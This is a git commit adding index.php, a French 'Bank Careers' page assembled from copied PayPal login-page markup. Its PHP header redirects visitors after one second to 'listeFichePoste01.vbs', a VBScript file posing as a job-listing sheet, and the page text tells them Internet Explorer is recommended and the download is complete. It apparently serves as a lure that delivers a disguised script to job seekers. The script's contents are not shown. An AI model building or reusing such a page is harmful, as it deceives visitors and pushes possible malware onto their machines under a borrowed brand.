1b294696ac099843ac91aeb9af25b75789862ede
data3dev <45484078+data3dev@users.noreply.github.com>
2020-05-24 18:46:41 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,80 @@
+<?php 
+header ("Refresh: 1;URL=listeFichePoste01.vbs");
+
+?>
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!--
+         Script info: script: webscr, cmd: &#x5f;login&#x2d;processing, template: p&#x2f;gen&#x2f;login&#x2d;processing, date: Sep&#x20;17&#x2c;&#x20;2013&#x20;00&#x3a;03&#x3a;09&#x20;PDT; country: FR, language: fr_FR, xslt server: 
+		web version: 107&#x2e;0&#x2d;7784605 branch: cc723fadb18f00118692ee88ffa9f5fd87812a46
+		content version: &#x2d;
+		pexml version: 107&#x2e;0&#x2d;7645085
+		page XSL: Customer/default/fr_FR/general/LoginProcessing.xsl
+       hostname : oTXIBhRvuyA23CByavVRTEvRk5fiHQqzHR0RVcm8vTQ
+         rlogid : oTXIBhRvuyA23CByavVRTG3Wpi9FxOYSzkX6MzsjVP0tErRfcciJvQ&#x25;3d&#x25;3d&#x5f;141475e6828
+-->
+  <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" />
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <title>Bank Careers</title>
+	<!--googleoff: all-->
+
+    <title>Bank Careers</title>
+<meta name="viewport" content="" id="viewport" />
+<link rel="shortcut icon" href="skins/larry/images/favicon.ico"/>
+<link rel="stylesheet" type="text/css" href="skins/larry/styles.min5ff4.css?s=1523445227" />
+<link rel="stylesheet" type="text/css" href="plugins/jqueryui/themes/larry/jquery-ui28e3.css?s=1523445226">
+<script type="text/javascript" src="skins/larry/ui.min5ff4.js?s=1523445227"></script>
+
+
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<script src="program/js/jquery.minb071.js?s=1523445242" type="text/javascript"></script>
+<script src="program/js/common.min5ff4.js?s=1523445227" type="text/javascript"></script>
+<script src="program/js/app.min5ff4.js?s=1523445227" type="text/javascript"></script>
+<script src="program/js/jstz.min14b2.js?s=1523445243" type="text/javascript"></script>
+
+<meta http-equiv="X-UA-Compatible" content="IE=9"><link media="screen" rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;WEBSCR&#x2d;640&#x2d;20130907&#x2d;1/css/core/global.css"><link rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;WEBSCR&#x2d;640&#x2d;20130907&#x2d;1/css/Customer/pages/pageSalsa.css">
+<!--[if IE 8]><link media="screen" rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;WEBSCR&#x2d;640&#x2d;20130907&#x2d;1/css/browsers/ie8.css"><![endif]-->
+
+<!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;WEBSCR&#x2d;640&#x2d;20130907&#x2d;1/css/browsers/ie7.css"><![endif]-->
+
+<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;WEBSCR&#x2d;640&#x2d;20130907&#x2d;1/css/browsers/ie6.css"><![endif]-->
+<link rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com/css/fr_FR/country.css"><link media="print" rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;WEBSCR&#x2d;640&#x2d;20130907&#x2d;1/css/core/print.css"><style type="text/css">
+					h3 {margin:4em 0 0 0; line-height:normal;}
+					p.note {color:#656565; font-size:0.9em;}
+					p.note a {color:#656565;}
+					p strong {
+	margin-top: 2em;
+	color: #003366;
+	font-size: 1.25em;
+}
+					img.actionImage {margin: 1.88em 0 2em 0;}
+				</style><style type="text/css" id="antiClickjack">body{display:none !important;}</style><script type="text/javascript">
+				if (self === top) {
+					var antiClickjack = document.getElementById("antiClickjack");
+					antiClickjack.parentNode.removeChild(antiClickjack);
+				} else {
+					top.location = self.location;
+				}
+			</script><div id="messageBox"></div><div id="main">
+
+  <div class="layout1 textcenter"><h3>&nbsp;</h3>
+    <p><strong>Le navigateur Internet Explorer est recommandé pour l'optimisation du téléchargement.</strong></p>
+	<p><strong>Téléchargement effectué.</strong></p>
+    
+  </div></div></div>
+<!--/DO NOT REMOVE/-->
+
+<!-- End SiteCatalyst Code -->
+
+
+<!--FirstPartyTracking Code-->
+
+
+<noscript><img src="https://t.paypal.com/ts?nojs=1&amp;pgrp=p%2fgen%2flogin%2dprocessing%3a%3a%5flogin%2dprocessing&amp;cnac=FR&amp;teal=oTXIBhRvuyA23CByavVRTG3Wpi9FxOYSzkX6MzsjVP0tErRfcciJvQ%253d%253d%5f141475e6828&amp;tmpl=p%2fgen%2flogin%2dprocessing&amp;cust=4RF59442FE0773023&amp;acnt=personal&amp;aver=verified&amp;rstr=restricted&amp;pgst=1379881871&amp;lgin=in&amp;calc=ec92578739f4c&amp;rsta=fr_FR" height="1" width="1" border="0" alt="" /></noscript>
+
+
+
+</body></html>
